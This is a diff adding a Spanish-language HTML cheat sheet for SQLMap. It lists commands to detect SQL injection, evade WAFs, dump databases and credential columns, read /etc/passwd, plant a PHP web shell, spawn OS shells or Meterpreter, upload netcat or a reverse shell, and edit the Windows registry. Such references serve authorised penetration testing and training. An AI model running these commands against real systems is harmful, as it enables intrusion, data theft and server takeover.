@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cheat Sheet SQLMap</title>
+    <link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+    <h1 class="main-title">SQLMap — Automatización de Inyección SQL</h1>
+
+    <h2 class="sr-only">Navegación</h2>
+    <div class="main-container">
+        <a href="../index.html" class="back-link">← Volver al Índice</a>
+
+        <div class="tabs-main">
+            <button class="tab-main" onclick="showMainTab(event, 'basico')">Básico</button>
+            <button class="tab-main" onclick="showMainTab(event, 'advanced')">Avanzado</button>
+            <button class="tab-main" onclick="showMainTab(event, 'techniques')">Técnicas</button>
+            <button class="tab-main" onclick="showMainTab(event, 'data')">Extracción</button>
+            <button class="tab-main" onclick="showMainTab(event, 'postex')">Post-Explotación</button>
+            <button class="tab-main" onclick="showMainTab(event, 'filter')">Filtros</button>
+        </div>
+
+        <!-- Buscador -->
+        <div class="search-box">
+            <input type="text" id="search" placeholder="Buscar comando..." oninput="filterCmds()">
+        </div>
+
+        <div class="allCmds" id="allCmds">
+
+            <!-- ========== BÁSICO ========== -->
+            <div class="tabs tab-content active" id="basico">
+                <div class="subtabs">
+                    <button class="tabsub-btn active" onclick="showSubTab(event, 'basico', 'deteccion')">Detección</button>
+                    <button class="tabsub-btn" onclick="showSubTab(event, 'basico', 'urls')">URLs y POST</button>
+                    <button class="tabsub-btn" onclick="showSubTab(event, 'basico', 'cookies')">Cookies / Headers</button>
+                </div>
+
+                <!-- Detección -->
+                <div class="subtab-content active" id="basico-deteccion">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Escaneo Básico</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL"</span><span class="cmd-desc">Detección automática de inyección en URL</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --batch</span><span class="cmd-desc">Modo automático (no interactivo)</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" -v 0</span><span class="cmd-desc">Verbose 0 — solo resultados</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --banner</span><span class="cmd-desc">Obtener banner de la BD</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --current-db</span><span class="cmd-desc">Nombre de la BD actual</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --current-user</span><span class="cmd-desc">Usuario actual de la BD</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --is-dba</span><span class="cmd-desc">Verificar si el usuario es DBA</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --dbs</span><span class="cmd-desc">Listar todas las bases de datos</span></div>
+                    </div>
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Nivel y Riesgo</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --level=5</span><span class="cmd-desc">Nivel de prueba máximo (1-5)</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --risk=3</span><span class="cmd-desc">Riesgo máximo (1-3) — incluye OR-based</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --level=5 --risk=3</span><span class="cmd-desc">Cobertura máxima</span></div>
+                    </div>
+                </div>
+
+                <!-- URLs y POST -->
+                <div class="subtab-content" id="basico-urls">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">URLs con Parámetros</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL?id=1"</span><span class="cmd-desc">Parámetro id vulnerable</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL?id=1" -p id</span><span class="cmd-desc">Forzar testing del parámetro id</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL?a=1&b=2" --skip="b"</span><span class="cmd-desc">Saltar parámetro b</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --randomize="id"</span><span class="cmd-desc">Randomizar valor del parámetro</span></div>
+                    </div>
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">POST Requests</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --data="user=admin&pass=*"</span><span class="cmd-desc">Testing de formulario POST</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --data="user=admin&pass=*" -p user</span><span class="cmd-desc">Forzar testing del parámetro user</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -r request.txt</span><span class="cmd-desc">Usar archivo de request (Burp export)</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -r request.txt -p user</span><span class="cmd-desc">Request file con parámetro forzado</span></div>
+                    </div>
+                </div>
+
+                <!-- Cookies / Headers -->
+                <div class="subtab-content" id="basico-cookies">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Cookies</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --cookie="session=abc123"</span><span class="cmd-desc">Inyectar vía cookie</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --cookie="session=*"</span><span class="cmd-desc">Marcar cookie para testing</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --cookie="session=abc123" --level=2</span><span class="cmd-desc">Level 2 incluye cookies en testing</span></div>
+                    </div>
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Headers Custom</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --headers="X-Forwarded-For: *"</span><span class="cmd-desc">Testing en header custom</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --referer="http://evil.com"</span><span class="cmd-desc">Custom Referer header</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --user-agent="Mozilla/5.0"</span><span class="cmd-desc">Custom User-Agent</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ========== AVANZADO ========== -->
+            <div class="tabs tab-content" id="advanced">
+                <div class="subtabs">
+                    <button class="tabsub-btn active" onclick="showSubTab(event, 'advanced', 'bypass')">Bypass WAF</button>
+                    <button class="tabsub-btn" onclick="showSubTab(event, 'advanced', 'tamper')">Tamper Scripts</button>
+                    <button class="tabsub-btn" onclick="showSubTab(event, 'advanced', 'optim')">Optimización</button>
+                </div>
+
+                <!-- Bypass WAF -->
+                <div class="subtab-content active" id="advanced-bypass">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Bypass WAF/IPS</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --tamper=space2comment</span><span class="cmd-desc">Espacios → comentarios /**/</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --tamper=space2plus</span><span class="cmd-desc">Espacios → +</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --tamper=charencode</span><span class="cmd-desc">URL encode todos los caracteres</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --tamper=between</span><span class="cmd-desc">> → BETWEEN, = → LIKE</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --tamper=randomcase</span><span class="cmd-desc">Randomizar case de keywords</span></div>
+                    </div>
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Combinaciones de Tamper</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --tamper=space2comment,randomcase</span><span class="cmd-desc">Múltiples tamper scripts</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --tamper=charencode,space2plus</span><span class="cmd-desc">URL encode + spaces</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap --list-tampers</span><span class="cmd-desc">Listar todos los tamper scripts</span></div>
+                    </div>
+                </div>
+
+                <!-- Tamper Scripts -->
+                <div class="subtab-content" id="advanced-tamper">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Scripts Más Útiles</h3>
+                        <div class="cmd-row"><span class="cmd-name">space2comment</span><span class="cmd-desc">SELECT → SELECT/**/</span></div>
+                        <div class="cmd-row"><span class="cmd-name">space2plus</span><span class="cmd-desc">SELECT → SELECT+</span></div>
+                        <div class="cmd-row"><span class="cmd-name">charencode</span><span class="cmd-desc">SELECT → %53%45%4C%45%43%54</span></div>
+                        <div class="cmd-row"><span class="cmd-name">randomcase</span><span class="cmd-desc">SELECT → SeLeCt</span></div>
+                        <div class="cmd-row"><span class="cmd-name">between</span><span class="cmd-desc">> → BETWEEN, = → LIKE</span></div>
+                        <div class="cmd-row"><span class="cmd-name">equaltolike</span><span class="cmd-desc">= → LIKE</span></div>
+                        <div class="cmd-row"><span class="cmd-name">greatest</span><span class="cmd-desc">> → GREATEST</span></div>
+                        <div class="cmd-row"><span class="cmd-name">halfversionedmorekeywords</span><span class="cmd-desc">MySQL comment bypass</span></div>
+                    </div>
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Bypass Específico</h3>
+                        <div class="cmd-row"><span class="cmd-name">apostrophemask</span><span class="cmd-desc">' → %EF%BC%87 (fullwidth)</span></div>
+                        <div class="cmd-row"><span class="cmd-name">apostrophenullencode</span><span class="cmd-desc">' → %00%27</span></div>
+                        <div class="cmd-row"><span class="cmd-name">symboliclogical</span><span class="cmd-desc">AND/OR → &&/||</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sp_replace</span><span class="cmd-desc">Espacios → /**/</span></div>
+                    </div>
+                </div>
+
+                <!-- Optimización -->
+                <div class="subtab-content" id="advanced-optim">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Performance</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --threads=10</span><span class="cmd-desc">Multi-hilos para extracción</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --flush-session</span><span class="cmd-desc">Limpiar cache de sesión anterior</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --fresh-queries</span><span class="cmd-desc">Ignorar queries en cache</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --session="sq.session"</span><span class="cmd-desc">Sesión personalizada</span></div>
+                    </div>
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Output</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" -o</span><span class="cmd-desc">Habilitar output a archivo</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --output-dir="outdir"</span><span class="cmd-desc">Directorio de salida custom</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --forms</span><span class="cmd-desc">Auto-detectar y testear formularios</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --crawl=3</span><span class="cmd-desc">Crawl hasta 3 niveles de profundidad</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ========== TÉCNICAS ========== -->
+            <div class="tabs tab-content" id="techniques">
+                <div class="subtabs">
+                    <button class="tabsub-btn active" onclick="showSubTab(event, 'techniques', 'types')">Tipos</button>
+                    <button class="tabsub-btn" onclick="showSubTab(event, 'techniques', 'timebased')">Time-Based</button>
+                    <button class="tabsub-btn" onclick="showSubTab(event, 'techniques', 'stacked')">Stacked Queries</button>
+                </div>
+
+                <!-- Tipos -->
+                <div class="subtab-content active" id="techniques-types">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Técnicas de Inyección</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --technique=U</span><span class="cmd-desc"> UNION query only</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --technique=E</span><span class="cmd-desc">Error-based only</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --technique=B</span><span class="cmd-desc">Boolean-blind only</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --technique=T</span><span class="cmd-desc">Time-based blind only</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --technique=S</span><span class="cmd-desc">Stacked queries only</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --technique=UST</span><span class="cmd-desc">Combinar múltiples técnicas</span></div>
+                    </div>
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Columnas (UNION)</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --columns</span><span class="cmd-desc">Forzar enumeración de columnas</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --union-cols=6</span><span class="cmd-desc">Forzar número de columnas</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --union-char="a"</span><span class="cmd-desc">Char para probar UNION</span></div>
+                    </div>
+                </div>
+
+                <!-- Time-Based -->
+                <div class="subtab-content" id="techniques-timebased">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Blind por Tiempo</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --time-sec=5</span><span class="cmd-desc">Timeout de 5 segundos</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --time-sec=10</span><span class="cmd-desc">Timeout más largo (redes lentas)</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --delay=1</span><span class="cmd-desc">1 segundo entre requests</span></div>
+                    </div>
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Fallback</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --fallback-logical="?OR"</span><span class="cmd-desc">Fallback lógico si time-based falla</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --invalid-logical</span><span class="cmd-desc">Invalidar lógica de fallback</span></div>
+                    </div>
+                </div>
+
+                <!-- Stacked -->
+                <div class="subtab-content" id="techniques-stacked">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Stacked Queries</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --stacked-test</span><span class="cmd-desc">Testear stacked queries</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --stacked-test --technique=S</span><span class="cmd-desc">Solo stacked queries</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ========== EXTRACCIÓN ========== -->
+            <div class="tabs tab-content" id="data">
+                <div class="subtabs">
+                    <button class="tabsub-btn active" onclick="showSubTab(event, 'data', 'enum')">Enumeración</button>
+                    <button class="tabsub-btn" onclick="showSubTab(event, 'data', 'dump')">Dump</button>
+                    <button class="tabsub-btn" onclick="showSubTab(event, 'data', 'files')">Archivos</button>
+                </div>
+
+                <!-- Enumeración -->
+                <div class="subtab-content active" id="data-enum">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Enumeración de BD</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --dbs</span><span class="cmd-desc">Listar bases de datos</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" -D dbname --tables</span><span class="cmd-desc">Tablas de una BD específica</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" -D dbname -T tablename --columns</span><span class="cmd-desc">Columnas de una tabla</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" -D dbname -T tablename --count</span><span class="cmd-desc">Número de registros en tabla</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" -D dbname -T tablename -C "user,pass" --dump</span><span class="cmd-desc">Dump columnas específicas</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" -D dbname -T tablename --dump</span><span class="cmd-desc">Dump tabla completa</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --dump-all</span><span class="cmd-desc">Todas las BDs (cuidado!)</span></div>
+                    </div>
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Filtros de Dump</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --dump -D dbname -T tablename --start=1 --stop=10</span><span class="cmd-desc">Primeros 10 registros</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --dump -C "user" --where="id=1"</span><span class="cmd-desc">Filtro WHERE personalizado</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --dump -T tablename --no-drop</span><span class="cmd-desc">No dropear tabla temporal</span></div>
+                    </div>
+                </div>
+
+                <!-- Dump -->
+                <div class="subtab-content" id="data-dump">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Opciones de Dump</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --dump --threads=5</span><span class="cmd-desc">Multi-hilo para dump</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --dump --batch</span><span class="cmd-desc">Auto-respuestas</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --dump --flush-session</span><span class="cmd-desc">Limpiar caché y re-dump</span></div>
+                    </div>
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Formato de Salida</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --dump --output-dir="output"</span><span class="cmd-desc">Guardar en directorio específico</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --dump --csv-del=","</span><span class="cmd-desc">Delimiter CSV custom</span></div>
+                    </div>
+                </div>
+
+                <!-- Archivos -->
+                <div class="subtab-content" id="data-files">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Lectura de Archivos</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --file-read="/etc/passwd"</span><span class="cmd-desc">Leer archivo del servidor</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --file-read="C:\Windows\win.ini"</span><span class="cmd-desc">Lectura en Windows</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/shell.php"</span><span class="cmd-desc">Escribir archivo en servidor</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ========== POST-EXPLOTACIÓN ========== -->
+            <div class="tabs tab-content" id="postex">
+                <div class="subtabs">
+                    <button class="tabsub-btn active" onclick="showSubTab(event, 'postex', 'shell')">Shell</button>
+                    <button class="tabsub-btn" onclick="showSubTab(event, 'postex', 'os')">OS Access</button>
+                    <button class="tabsub-btn" onclick="showSubTab(event, 'postex', 'reg')">Registry</button>
+                </div>
+
+                <!-- Shell -->
+                <div class="subtab-content active" id="postex-shell">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Acceso a Shell</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --os-shell</span><span class="cmd-desc">Shell interactiva del sistema</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --os-cmd="whoami"</span><span class="cmd-desc">Ejecutar comando específico</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --os-pwn</span><span class="cmd-desc">Meterpreter si SQL Server (sysadmin)</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --os-cmd="id" --dbms=mysql</span><span class="cmd-desc">Forzar DBMS para cmd</span></div>
+                    </div>
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Reverse Shell</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --os-shell --file-write="nc.exe" --file-dest="C:\\Windows\\nc.exe"</span><span class="cmd-desc">Subir nc al servidor</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --file-write="shell.py" --file-dest="/tmp/shell.py"</span><span class="cmd-desc">Subir reverse shell Python</span></div>
+                    </div>
+                </div>
+
+                <!-- OS Access -->
+                <div class="subtab-content" id="postex-os">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Información del Sistema</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --os-cmd="uname -a"</span><span class="cmd-desc">Info del kernel (Linux)</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --os-cmd="systeminfo"</span><span class="cmd-desc">Info del sistema (Windows)</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --os-cmd="whoami /all"</span><span class="cmd-desc">Usuario y privilegios (Windows)</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --os-cmd="net user"</span><span class="cmd-desc">Usuarios del sistema (Windows)</span></div>
+                    </div>
+                </div>
+
+                <!-- Registry -->
+                <div class="subtab-content" id="postex-reg">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Registry (Windows)</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --reg-read</span><span class="cmd-desc">Leer valores del registro</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --reg-add</span><span class="cmd-desc">Agregar valor al registro</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --reg-del</span><span class="cmd-desc">Eliminar valor del registro</span></div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ========== FILTROS ========== -->
+            <div class="tabs tab-content" id="filter">
+                <div class="subtabs">
+                    <button class="tabsub-btn active" onclick="showSubTab(event, 'filter', 'bypass')">Bypass Filtros</button>
+                    <button class="tabsub-btn" onclick="showSubTab(event, 'filter', 'encoding')">Encoding</button>
+                </div>
+
+                <!-- Bypass Filtros -->
+                <div class="subtab-content active" id="filter-bypass">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Bypass de Filtrado</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --tamper=space2comment --random-agent</span><span class="cmd-desc">Combinar bypass de WAF</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --skip-static --skip-dynamic</span><span class="cmd-desc">Saltar checks estáticos/dinámicos</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --string="string"</span><span class="cmd-desc">String esperado para true</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --not-string="string"</span><span class="cmd-desc">String para false</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --regexp="regexp"</span><span class="cmd-desc">Regexp esperado en response</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --code=200</span><span class="cmd-desc">Código HTTP esperado</span></div>
+                    </div>
+                </div>
+
+                <!-- Encoding -->
+                <div class="subtab-content" id="filter-encoding">
+                    <div class="cmd-group">
+                        <h3 class="cmd-group-title">Encoding</h3>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --encoding="utf-8"</span><span class="cmd-desc">Forzar encoding de respuesta</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --charset="0123456789abcdef"</span><span class="cmd-desc">Charset para boolean blind</span></div>
+                        <div class="cmd-row"><span class="cmd-name">sqlmap -u "URL" --no-escape</span><span class="cmd-desc">No escape payloads</span></div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script src="../scripts.js"></script>
+</body>
+</html>
